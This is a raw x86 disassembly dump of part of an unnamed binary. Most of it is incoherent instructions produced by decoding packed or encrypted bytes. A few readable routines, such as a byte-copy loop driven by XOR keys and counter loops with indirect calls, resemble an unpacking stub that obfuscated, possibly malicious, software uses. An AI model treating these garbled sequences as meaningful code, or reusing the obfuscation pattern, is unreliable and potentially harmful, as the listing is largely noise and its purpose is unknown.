  4028f9:	test   DWORD PTR [edx-0x3469e712],edi
  4028ff:	push   ds
  402900:	popf   
  402901:	inc    ebp
  402902:	jae    0x4028a4
  402904:	xchg   al,dh
  402906:	imul   esp,ecx,0xffffff9f
  402909:	das    
  40290a:	fiadd  DWORD PTR [ebx+ebx*4-0x25f8c71e]
  402911:	push   edx
  402912:	call   DWORD PTR [edi+0x7d8e900a]
  402918:	fs mov esp,0x4577b9e4
  40291e:	add    BYTE PTR [ecx],0xbc
  402921:	inc    ecx
  402922:	call   0xb345:0x51ee24f2
  402929:	cmp    DWORD PTR [ecx],edx
  40292b:	sub    DWORD PTR [edx-0x1d270a4],edi
  402931:	push   ss
  402932:	mov    al,BYTE PTR [eax+edx*2+0x1b6de1d6]
  402939:	add    esi,0x7675ca18
  40293f:	inc    ebx
  402940:	jb     0x40298c
  402942:	dec    esp
  402943:	sub    DWORD PTR [edx+0x45],edi
  402946:	cmc    
  402947:	fldenv [eax+0x44a1027b]
  40294d:	ror    BYTE PTR [edx+0xc367f48],cl
  402953:	pop    ecx
  402954:	lods   al,BYTE PTR ds:[esi]
  402955:	adc    ch,BYTE PTR [eax-0x5d737df4]
  40295b:	pusha  
  40295c:	ins    DWORD PTR es:[edi],dx
  40295d:	jbe    0x40290e
  40295f:	adc    DWORD PTR [edx],esi
  402961:	stc    
  402962:	addr16 ss gs (bad) 
  402966:	push   ds
  402967:	xchg   BYTE PTR [eax-0x3062df40],al
  40296d:	add    ecx,DWORD PTR [eax+0x63]
  402970:	and    BYTE PTR [ebx+edx*1+0xb531f0e],ah
  402977:	fsubr  st,st(0)
  402979:	jp     0x4029df
  40297b:	les    esp,FWORD PTR [ebp-0x16dda250]
  402981:	popa   
  402982:	jnp    0x402985
  402984:	add    ch,dh
  402986:	popf   
  402987:	sbb    eax,0x3800055e
  40298c:	test   al,0x4a
  40298e:	jns    0x4029b7
  402990:	fwait
  402991:	mov    es,WORD PTR [ebp+0x2f]
  402994:	cdq    
  402995:	and    BYTE PTR [esp+ecx*8+0x3a],0x62
  40299a:	jmp    0x402950
  40299c:	std    
  40299d:	sub    BYTE PTR [ebx-0x57],dh
  4029a0:	cmp    esi,DWORD PTR [eax+0x7a]
  4029a3:	jb     0x40298e
  4029a5:	ret    0xc881
  4029a8:	mov    BYTE PTR [ebx+0x7ba42340],cl
  4029ae:	imul   ebp,DWORD PTR [ebx],0x62cf145f
  4029b4:	dec    edx
  4029b5:	fnsave [ebp+0x6445ccbb]
  4029bb:	(bad)  
  4029bc:	pop    ds
  4029bd:	mov    cl,bl
  4029bf:	leave  
  4029c0:	push   0x57
  4029c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c3:	push   ds
  4029c4:	dec    esp
  4029c5:	in     al,dx
  4029c6:	hlt    
  4029c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c8:	(bad)  
  4029c9:	xchg   ebp,eax
  4029ca:	mov    BYTE PTR [esi-0x15],dh
  4029cd:	nop
  4029ce:	jecxz  0x402957
  4029d0:	fst    QWORD PTR [edx]
  4029d2:	test   al,0x9c
  4029d4:	dec    ebp
  4029d5:	jns    0x402a13
  4029d7:	or     eax,DWORD PTR [ecx]
  4029d9:	mov    ah,0xab
  4029db:	xchg   ebp,eax
  4029dc:	xchg   esp,eax
  4029dd:	push   ebx
  4029de:	test   ebp,0x1e9fda9d
  4029e4:	mov    ah,0xef
  4029e6:	leave  
  4029e7:	lods   al,BYTE PTR ds:[esi]
  4029e8:	ins    BYTE PTR es:[edi],dx
  4029e9:	mov    DWORD PTR [eax+edi*1+0x6e],ebx
  4029ed:	xacquire xchg BYTE PTR [ebx+eax*8-0xc],ch
  4029f2:	mov    esp,0x186292ec
  4029f7:	int3   
  4029f8:	pop    ebx
  4029f9:	cmp    bl,bl
  4029fb:	pop    ds
  4029fc:	add    DWORD PTR ds:0xe8c88cbc,0x57fdc70
  402a06:	mov    ebx,0x4da1ddd3
  402a0b:	fnsave [eax]
  402a0d:	rcr    ch,0x82
  402a10:	jl     0x402a44
  402a12:	ret    
  402a13:	mov    cl,0x50
  402a15:	jmp    0x4587:0x25815182
  402a1c:	inc    ebx
  402a1d:	add    BYTE PTR [eax],al
  402a1f:	add    BYTE PTR [eax],al
  402a21:	add    cl,ch
  402a23:	or     eax,0x8b000000
  402a28:	adc    eax,0x434587
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434587,edx
  402a34:	cmp    DWORD PTR ds:0x434587,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434587,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4344e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434587,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434587
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434587,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4344ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43453b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434577,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434577
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434577,ecx
  402aac:	cmp    DWORD PTR ds:0x434577,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434577,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43460f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4345fb
  402ae8:	or     DWORD PTR ds:0x4345c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4345b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4345c3,0x434503
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	cdq    
  402b20:	jg     0x402b17
  402b22:	sub    BYTE PTR [ebx+0x9],dh
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402ba7
  402b2c:	out    0x94,eax
  402b2e:	mov    edi,0x1c4004bd
  402b33:	mov    WORD PTR [bx+di],es
  402b36:	cmp    bh,BYTE PTR [ebx+0x5237b962]
  402b3c:	mov    bl,0xf7
  402b3e:	xor    al,0x17
  402b40:	xor    al,0xce
  402b43:	mov    al,ds:0xd7c8a7d5
  402b48:	scas   eax,DWORD PTR es:[edi]
  402b49:	add    eax,DWORD PTR [ecx-0x5f]
  402b4c:	jecxz  0x402b53
  402b4e:	daa    
  402b4f:	addr16 mov dl,0xc8
  402b52:	es (bad) 
  402b54:	push   ss
  402b55:	in     eax,dx
  402b56:	jmp    0x402b1e
  402b58:	stos   BYTE PTR es:[edi],al
  402b59:	out    0xf4,eax
  402b5b:	nop
  402b5c:	or     edx,ebp
  402b5e:	or     eax,DWORD PTR [esi+0x510cbda8]
  402b64:	sub    ah,cl
  402b66:	sub    eax,0x9e62c605
  402b6b:	stos   BYTE PTR es:[edi],al
  402b6c:	dec    edi
  402b6d:	xchg   ebx,eax
  402b6e:	pop    ss
  402b6f:	fdivr  QWORD PTR [edx+ebp*8+0x58]
  402b73:	in     al,dx
  402b74:	mov    dh,0xe4
  402b76:	test   eax,0x6fe70d89
  402b7b:	scas   al,BYTE PTR es:[edi]
  402b7c:	sbb    al,0x7a
  402b7e:	push   ss
  402b7f:	xor    bl,BYTE PTR [edi+ebp*8]
  402b82:	adc    ah,BYTE PTR [edi+edi*1+0x3685f785]
  402b89:	sbb    BYTE PTR [esi-0x41],bh
  402b8c:	sub    eax,0x663a9e30
  402b91:	ror    DWORD PTR [edi+ebx*1],1
  402b94:	ds (bad) 
  402b96:	pushf  
  402b97:	push   ebp
  402b98:	or     ebp,esp
  402b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b9b:	hlt    
  402b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b9d:	loop   0x402b9c
  402b9f:	adc    BYTE PTR [ebx],0x2d
  402ba2:	mov    dl,0xb9
  402ba4:	jg     0x402b7d
  402ba6:	pop    esi
  402ba7:	ror    BYTE PTR [edx+0x26],cl
  402baa:	adc    eax,0x706a398a
  402baf:	rol    BYTE PTR [ecx+0x612f3d09],1
  402bb5:	adc    BYTE PTR [edi],ah
  402bb7:	mov    ch,0x48
  402bb9:	in     eax,0x3e
  402bbb:	in     al,dx
  402bbc:	dec    esp
  402bbd:	shl    dl,cl
  402bbf:	or     DWORD PTR [ebx-0x6a],edi
  402bc2:	push   0x1636a6c0
  402bc7:	in     al,dx
  402bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc9:	or     BYTE PTR [edi-0x24bdac2d],0x76
  402bd0:	lock ficomp DWORD PTR [edi]
  402bd3:	push   edx
  402bd4:	inc    ebp
  402bd5:	(bad)  
  402bd6:	adc    eax,esp
  402bd8:	sete   BYTE PTR [ebx-0x20e14fc]
  402bdf:	imul   esp,DWORD PTR [esi+ebx*8],0x8
  402be3:	mov    ds:0x7730416f,al
  402be8:	sbb    BYTE PTR [eax+0x36],ah
  402beb:	addr16 sbb eax,0x6bbe4329
  402bf1:	test   eax,0x24fbf1e0
  402bf6:	pop    ecx
  402bf7:	das    
  402bf8:	sub    al,0x13
  402bfa:	jo     0x402bbc
  402bfc:	adc    esi,esp
  402bfe:	(bad)  
  402c00:	add    BYTE PTR [esi],dl
  402c02:	jns    0x402c33
  402c04:	and    dh,BYTE PTR [edx-0x7b]
  402c07:	daa    
  402c08:	pop    eax
  402c09:	add    BYTE PTR [ecx-0x123f721d],0x3c
  402c10:	les    ecx,FWORD PTR [edi+ebx*2]
  402c13:	adc    DWORD PTR [eax],edx
  402c15:	rcl    DWORD PTR [esp+eiz*8+0x7b],cl
  402c19:	loopne 0x402c69
  402c1b:	call   0x26f0:0x4ede3b43
  402c22:	dec    esp
  402c23:	mov    edx,0xe5bce5f2
  402c28:	call   0xe59e:0x546060b0
  402c2f:	sub    edx,0xbd4c5d1
  402c35:	call   0x7f95ba66
  402c3a:	call   0x68e11bc
  402c3f:	mov    DWORD PTR [eax-0x4b],ebp
  402c42:	aaa    
  402c43:	push   esi
  402c44:	dec    ecx
  402c45:	pop    eax
  402c46:	inc    edx
  402c47:	rcr    BYTE PTR [esp+edx*4+0x62],0x3
  402c4c:	(bad)  
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434507,0x0
  402c5f:	mov    eax,ds:0x434507
  402c64:	inc    eax
  402c65:	mov    ds:0x434507,eax
  402c6a:	cmp    DWORD PTR ds:0x434507,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434507,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4344e7,0x434613
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	xor    eax,0x13f1d6b0
  402ceb:	or     edi,DWORD PTR [esi+0x7e]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402cae
  402cf3:	sar    dh,1
  402cf5:	jbe    0x402cea
  402cf7:	cs test eax,0x4eb423b5
  402cfd:	lods   al,BYTE PTR ds:[esi]
  402cfe:	in     eax,dx
  402cff:	js     0x402d10
  402d01:	add    eax,0x8f6dc0a4
  402d06:	enter  0x9d5b,0x99
  402d0a:	mov    al,0x64
  402d0c:	dec    esi
  402d0d:	push   esp
  402d0e:	(bad)  
  402d0f:	iret   
  402d10:	jb     0x402cf6
  402d12:	pop    ecx
  402d13:	int    0x70
  402d15:	int3   
  402d16:	rcl    eax,1
  402d18:	sbb    esp,DWORD PTR [ebx+0xe]
  402d1b:	call   0x52bd:0xb5736c73
  402d22:	lods   al,BYTE PTR ds:[esi]
  402d23:	outs   dx,BYTE PTR ds:[esi]
  402d24:	in     al,dx
  402d25:	pop    edx
  402d26:	xchg   edi,eax
  402d27:	sub    dl,BYTE PTR [ebp+0x7dc35c62]
  402d2d:	aam    0xd1
  402d2f:	outs   dx,BYTE PTR ds:[esi]
  402d30:	pop    edx
  402d31:	and    eax,0x9556d7ba
  402d36:	test   BYTE PTR [ebx],0x57
  402d39:	jge    0x402cd3
  402d3b:	es push esi
  402d3d:	inc    edx
  402d3e:	sti    
  402d3f:	loopne 0x402d8a
  402d41:	stos   BYTE PTR es:[edi],al
  402d42:	adc    bl,BYTE PTR [edi+eiz*1]
  402d45:	arpl   WORD PTR [eax+0x1a],bx
  402d48:	mov    BYTE PTR [edx+0x42eb9a16],bh
  402d4e:	adc    al,0xba
  402d50:	adc    esp,DWORD PTR [esi+eax*1]
  402d53:	cwde   
  402d54:	jo     0x402d6f
  402d56:	jns    0x402d8a
  402d58:	adc    eax,0x622f2c6d
  402d5d:	outs   dx,DWORD PTR ds:[esi]
  402d5e:	xchg   edi,eax
  402d5f:	clc    
  402d60:	add    DWORD PTR [edi-0x7f],esi
  402d63:	aas    
  402d64:	lds    ecx,FWORD PTR [edx-0x68]
  402d67:	(bad)  
  402d68:	xlat   BYTE PTR ds:[ebx]
  402d69:	cdq    
  402d6a:	scas   al,BYTE PTR es:[edi]
  402d6b:	xor    DWORD PTR [edx],edx
  402d6d:	mov    ecx,0x5e0bf23e
  402d72:	or     eax,0xd847d35f
  402d77:	and    dh,bh
  402d79:	sub    DWORD PTR [edx-0x50],edx
  402d7c:	addr16 pop ecx
  402d7e:	pop    esi
  402d7f:	xor    dl,al
  402d81:	pop    eax
  402d82:	lea    eax,[eax]
  402d84:	mov    ds:0x3b306306,al
  402d89:	nop
  402d8a:	iret   
  402d8b:	sbb    cl,dl
  402d8d:	jnp    0x402d1f
  402d8f:	mov    dl,0xe4
  402d91:	add    al,0x95
  402d93:	mov    ecx,0xd58f98c1
  402d98:	addr16 fwait
  402d9a:	jne    0x402d28
  402d9c:	mov    BYTE PTR [edi+0x5e],ah
  402d9f:	pushf  
  402da0:	jmp    0xf5c456e3
  402da5:	or     eax,0xe973288b
  402daa:	add    ebx,DWORD PTR [ebx-0x5127b240]
  402db0:	pop    esp
  402db1:	push   ss
  402db2:	out    0x29,eax
  402db4:	repnz sub al,0xf6
  402db7:	shl    DWORD PTR [eax-0x45],cl
  402dba:	test   BYTE PTR [edi],ch
  402dbc:	out    0x8d,al
  402dbe:	jnp    0x402dc5
  402dc0:	add    BYTE PTR [eax+0x79],ah
  402dc3:	aas    
  402dc4:	sub    dl,BYTE PTR [edx-0x62]
  402dc7:	dec    eax
  402dc8:	or     bh,ah
  402dca:	shl    BYTE PTR [edx+0x2a],cl
  402dcd:	sub    al,0x96
  402dcf:	dec    esp
  402dd0:	enter  0x7ab2,0x4c
  402dd4:	or     al,0x35
  402dd6:	pop    edx
  402dd7:	fadd   DWORD PTR [edi]
  402dda:	ds jo  0x402d5f
  402ddd:	mov    dl,0x7e
  402ddf:	out    0xda,al
  402de1:	mov    eax,0xe6397ea5
  402de6:	test   eax,0x1c0cd624
  402deb:	add    ah,bl
  402ded:	out    dx,eax
  402dee:	hlt    
  402def:	(bad)  
  402df0:	adc    eax,0x15283dcc
  402df5:	jo     0x402e6f
  402df7:	xor    DWORD PTR [ebp-0x37],edx
  402dfa:	inc    ebp
  402dfb:	call   0xa4ca2586
  402e00:	stos   BYTE PTR es:[edi],al
  402e01:	add    BYTE PTR [edx],0x9f
  402e04:	sbb    edi,DWORD PTR [esi]
  402e06:	outs   dx,BYTE PTR ds:[esi]
  402e07:	xor    DWORD PTR [ebp+0x51],edx
  402e0a:	xchg   edi,eax
  402e0b:	sub    bl,BYTE PTR [eax+0x3d]
  402e0e:	(bad)  
  402e0f:	(bad)  
  402e10:	mov    bh,0x96
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434577,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    ch,BYTE PTR [ebp+0x7a]
  402e94:	xchg   al,ah
  402e96:	xor    edx,DWORD PTR [esi+edi*2]
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402ed2
  402e9f:	pop    ds
  402ea0:	int3   
  402ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea2:	cwde   
  402ea3:	jb     0x402e5a
  402ea5:	jge    0x402e48
  402ea7:	ja     0x402f11
  402ea9:	adc    DWORD PTR [eax],0x4c
  402eac:	aam    0x13
  402eae:	jns    0x402f0d
  402eb0:	add    DWORD PTR [edi],esi
  402eb2:	lods   al,BYTE PTR ds:[esi]
  402eb3:	push   eax
  402eb4:	repz pop edi
  402eb6:	mov    BYTE PTR [esi+0x4ddba3b9],cl
  402ebc:	inc    esp
  402ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ebe:	xchg   DWORD PTR [edx],ebp
  402ec0:	popa   
  402ec1:	mov    cl,0xf5
  402ec3:	test   eax,0xec519b38
  402ec8:	fistp  QWORD PTR [eax-0x27]
  402ecb:	mov    dh,0x39
  402ecd:	stos   DWORD PTR es:[edi],eax
  402ece:	test   BYTE PTR [eax+0x56],0x14
  402ed2:	cmc    
  402ed3:	jmp    0xe692:0xfa6ef378
  402eda:	dec    ebx
  402edb:	sub    BYTE PTR [esi+esi*1],0x52
  402edf:	pop    ebx
  402ee0:	outs   dx,BYTE PTR ds:[esi]
  402ee1:	xor    ah,BYTE PTR [ecx+ebx*1]
  402ee4:	hlt    
  402ee5:	mov    ds,WORD PTR [edi+0x5c27526d]
  402eeb:	adc    BYTE PTR [edx],al
  402eed:	bound  esi,QWORD PTR [ebx]
  402eef:	sub    ebp,DWORD PTR cs:[esi-0x286f4893]
  402ef6:	push   es
  402ef7:	sub    BYTE PTR [ebp-0x6c9c3ad9],ah
  402efd:	into   
  402efe:	(bad)  
  402eff:	jmp    0x39ee:0x6a856ec3
  402f06:	adc    dl,BYTE PTR [eax-0xd]
  402f09:	cmc    
  402f0a:	or     eax,0xd57818f8
  402f0f:	(bad)  
  402f10:	sub    ebx,DWORD PTR [eax-0xb]
  402f13:	sti    
  402f14:	jp     0x402eea
  402f16:	jp     0x402f61
  402f18:	inc    esi
  402f19:	imul   ebp,DWORD PTR [edi-0x55],0x44
  402f1d:	jne    0x402eb1
  402f1f:	loop   0x402ede
  402f21:	mov    al,BYTE PTR [ebx+ecx*1+0x76]
  402f25:	vminsd xmm2,xmm5,QWORD PTR [ebp-0x3b]
  402f2a:	dec    edi
  402f2b:	push   edi
  402f2c:	(bad)  
  402f2d:	sub    BYTE PTR [esi],bl
  402f2f:	jbe    0x402fa6
  402f31:	iret   
  402f32:	jo     0x402ec7
  402f34:	and    ebp,edi
  402f36:	aas    
  402f37:	jmp    0x402eba
  402f39:	cmp    al,0xe
  402f3b:	sbb    eax,0x8eb271ee
  402f40:	pop    ss
  402f41:	and    al,0xd8
  402f43:	and    dh,dl
  402f45:	ja     0x402edb
  402f47:	cwde   
  402f48:	pop    es
  402f49:	loopne 0x402ed9
  402f4b:	pop    ebx
  402f4c:	cs cwde 
  402f4e:	ret    
  402f4f:	(bad)  
  402f50:	imul   esp,DWORD PTR [esi+0xa],0x64
  402f54:	test   eax,0xc03a7496
  402f59:	int3   
  402f5a:	test   DWORD PTR [ebp-0x2d],ebx
  402f5d:	xchg   esi,eax
  402f5e:	dec    esi
  402f5f:	ins    BYTE PTR es:[edi],dx
  402f60:	cmc    
  402f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f62:	jae    0x402ef6
  402f64:	sub    DWORD PTR [ebp-0x13],0x4
  402f68:	sub    esi,DWORD PTR [ebx+0x22857df8]
  402f6e:	cmp    eax,DWORD PTR [edx]
  402f70:	shl    DWORD PTR [edi+0x5e],1
  402f73:	retf   0xa32f
  402f76:	push   ecx
  402f77:	jnp    0x402f7c
  402f79:	icebp  
  402f7a:	in     eax,dx
  402f7b:	pushf  
  402f7c:	add    esp,edx
  402f7e:	lods   al,BYTE PTR ds:[esi]
  402f7f:	arpl   sp,di
  402f81:	pop    edx
  402f82:	into   
  402f83:	sub    al,0x98
  402f85:	fst    QWORD PTR [ebp+0x6e1e4434]
  402f8b:	sub    ebp,DWORD PTR [edx-0x4d]
  402f8e:	cmc    
  402f8f:	or     DWORD PTR [edi+0x1a],esi
  402f92:	call   0xe9dc:0x88af65b2
  402f99:	fwait
  402f9a:	scas   eax,DWORD PTR es:[edi]
  402f9b:	jno    0x402f59
  402f9d:	cmp    DWORD PTR [ecx],edx
  402f9f:	stc    
  402fa0:	jnp    0x402fa4
  402fa2:	dec    eax
  402fa3:	xlat   BYTE PTR ds:[ebx]
  402fa4:	pop    esp
  402fa5:	fisub  WORD PTR [ebp-0x77]
  402fa8:	lock lods eax,DWORD PTR ds:[esi]
  402faa:	hlt    
  402fab:	stos   DWORD PTR es:[edi],eax
  402fac:	or     al,0x61
  402fae:	std    
  402faf:	test   al,0x71
  402fb1:	(bad)  [eax*4-0x7911262]
  402fb8:	or     dh,bh
  402fba:	sbb    eax,0x533b072d
  402fbf:	dec    ebp
  402fc0:	aaa    
  402fc1:	scas   eax,DWORD PTR es:[edi]
  402fc2:	dec    eax
  402fc3:	or     esp,esi
  402fc5:	cmc    
  402fc6:	dec    ebp
  402fc7:	cmp    DWORD PTR [ebp+0x38],0x5f64260d
  402fce:	mov    bh,0xbf
  402fd0:	aad    0xf1
  402fd2:	pop    esi
  402fd3:	jge    0x40303f
  402fd5:	call   0x5c6b97ea
  402fda:	imul   ebp,esi,0xffffffc8
  402fdd:	(bad)
  402fe0:	jno    0x402f6a
  402fe2:	mov    edx,0xf2f04d24
  402fe7:	ds mov ecx,0xf739b9ca
  402fed:	dec    esi
  402fee:	stos   DWORD PTR es:[edi],eax
  402fef:	mov    cl,0xd3
  402ff1:	out    0x93,al
  402ff3:	stc    
  402ff4:	clc    
  402ff5:	mov    ecx,0x470dc072
  402ffa:	sub    BYTE PTR [edi+0x11],bh
  402ffd:	icebp  
  402ffe:	sbb    DWORD PTR [edi-0x18c85afb],eax
  403004:	call   0x4e42eaed
  403009:	inc    esp
  40300a:	jbe    0x402fbd
  40300c:	lods   al,BYTE PTR ds:[esi]
  40300d:	jle    0x402fcc
  40300f:	ja     0x402fd1
  403011:	les    edx,FWORD PTR [ebx+ebp*2-0x43]
  403015:	xor    eax,0xd53151ac
  40301a:	daa    
  40301b:	sbb    DWORD PTR [ebp-0x670894a2],esi
  403021:	leave  
  403022:	retf   
  403023:	imul   edi,DWORD PTR [ecx-0x1],0x9a1e26de
  40302a:	mov    bl,0xec
  40302c:	fld    TBYTE PTR [edx]
  40302e:	lods   al,BYTE PTR ds:[esi]
  40302f:	call   0x4726:0x5f3eddbd
  403036:	ret    
  403037:	icebp  
  403038:	(bad)  
  403039:	dec    edx
  40303a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40303b:	cli    
  40303c:	mov    ds:0x2b67dea5,eax
  403041:	js     0x40300f
  403043:	nop
  403044:	jnp    0x402fe4
  403046:	pop    ebp
  403047:	xchg   esi,eax
  403048:	or     eax,0x13f2326c
  40304d:	sbb    eax,0x57d4a3c6
  403052:	mov    WORD PTR [ecx-0x54],ss
  403055:	mov    ds:0x7fab9be0,eax
  40305a:	lods   eax,DWORD PTR ds:[esi]
  40305b:	and    DWORD PTR [edx],esp
  40305d:	pop    esp
  40305e:	enter  0x3dfd,0x79
  403062:	push   0xffffff9b
  403064:	popa   
  403065:	jecxz  0x4030aa
  403067:	inc    edx
  403068:	lock add al,0x20
  40306b:	bound  esp,QWORD PTR [ebp-0x19]
  40306e:	js     0x403020
  403070:	jo     0x4030de
  403072:	bound  eax,QWORD PTR [edi+esi*1-0x8f396e8]
  403079:	inc    esp
  40307a:	repnz iret 
  40307c:	pop    es
  40307d:	xlat   BYTE PTR ds:[ebx]
  40307e:	icebp  
  40307f:	cdq    
  403080:	lods   eax,DWORD PTR ds:[esi]
  403081:	sbb    eax,0x68a6c87c
  403086:	sub    BYTE PTR [eax],dh
  403088:	in     eax,dx
  403089:	pushf  
  40308a:	or     ebx,DWORD PTR [edi-0x61]
  40308d:	mov    al,ds:0xebeab43d
  403092:	lahf   
  403093:	xor    edi,eax
  403095:	adc    edx,DWORD PTR [eax-0x109a12d2]
  40309b:	jns    0x403037
  40309d:	repz xor DWORD PTR [ecx],edx
  4030a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a1:	lahf   
  4030a2:	int3   
  4030a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a4:	cmp    DWORD PTR ds:0x3bce52c1,eax
  4030aa:	cmp    edx,DWORD PTR ds:0x7d114b7f
  4030b0:	cmp    esi,DWORD PTR [edx]
  4030b2:	iret   
  4030b3:	sub    eax,esi
  4030b5:	dec    esi
  4030b6:	dec    ebp
  4030b7:	daa    
  4030b8:	retf   
  4030b9:	jle    0x403105
  4030bb:	xlat   BYTE PTR ds:[ebx]
  4030bc:	inc    DWORD PTR [eax-0x6a3d6949]
  4030c2:	cmp    BYTE PTR [ecx-0x36e6797b],ah
  4030c8:	cmp    eax,0xf65e41fd
  4030cd:	(bad)  
  4030ce:	lock cmc 
  4030d0:	(bad)  
  4030d1:	jb     0x4030d8
  4030d3:	dec    edi
  4030d4:	leave  
  4030d5:	push   esi
  4030d6:	inc    eax
  4030d7:	cmc    
  4030d8:	xchg   edx,eax
  4030d9:	rcr    DWORD PTR [edx+0x24f88f0],1
  4030df:	pop    ds
  4030e0:	fdiv   st,st(6)
  4030e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030e3:	push   0xffffffea
  4030e5:	sar    DWORD PTR [ebx-0x1e],0xb7
  4030e9:	shl    bh,0x92
  4030ec:	ret    
  4030ed:	mov    ebx,0x1ef796ee
  4030f2:	icebp  
  4030f3:	in     al,dx
  4030f4:	cwde   
  4030f5:	stos   BYTE PTR es:[edi],al
  4030f6:	cmp    DWORD PTR [eax],edx
  4030f8:	add    BYTE PTR [ebx+0x662cb282],dh
  4030fe:	dec    edx
  4030ff:	test   al,0x2e
  403101:	adc    al,0xd4
  403103:	sbb    eax,0xbbabecda
  403108:	sbb    esp,DWORD PTR [edx]
  40310a:	xchg   DWORD PTR [ebp-0x222dd5c7],esi
  403110:	mov    al,ds:0xe6ab8680
  403115:	ficom  DWORD PTR [edi]
